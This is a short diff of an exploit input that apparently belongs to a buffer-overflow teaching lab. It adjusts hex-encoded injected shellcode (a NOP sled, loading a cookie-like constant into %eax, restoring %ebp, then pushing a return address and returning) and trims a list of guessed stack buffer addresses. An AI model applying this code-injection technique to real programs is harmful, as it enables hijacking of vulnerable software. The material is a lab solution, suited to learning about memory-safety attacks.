@@ -199,7 +199,7 @@
 90 90 90
 
 b8 19 07 fe 77  /* mov    $0x77fe0719,%eax */
-8d 6c 24 1c     /* lea    0x1c(%esp),%ebp */
+8d 6c 24 18     /* lea    0x18(%esp),%ebp */
 68 95 95 04 08  /* push   $0x8049595 */
 c3              /* ret */
 
@@ -223,12 +223,6 @@ c3              /* ret */
 
 /* buf maybe: */
 /*
-0x5568b54a
-0x5568b5aa
-0x5568b4fa
-0x5568b4ca
-0x5568b51a
-
 0x5568ae2a
 0x5568ae9a
 0x5568ae6a
